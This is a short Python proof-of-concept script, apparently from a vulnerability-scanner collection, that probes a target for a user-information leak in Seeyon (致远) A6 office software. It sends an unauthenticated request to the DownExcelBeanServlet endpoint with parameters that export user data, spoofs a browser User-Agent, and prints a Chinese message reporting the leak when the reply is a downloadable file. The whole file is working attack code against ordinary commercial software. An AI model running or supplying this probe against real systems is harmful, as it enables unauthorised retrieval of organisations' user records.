import httpx
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def poc(target):
    try:
        target = get_standard_url(target)
        url = target + '/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0'
        req = httpx.get(url,headers=headers)
        if "attachment"  in req.headers['content-disposition'] and "application/x-msdownload" in req.headers['content-type']:
            print("\033[0;31m 存在致远A6用户信息泄露："+ url )
    except:
        pass


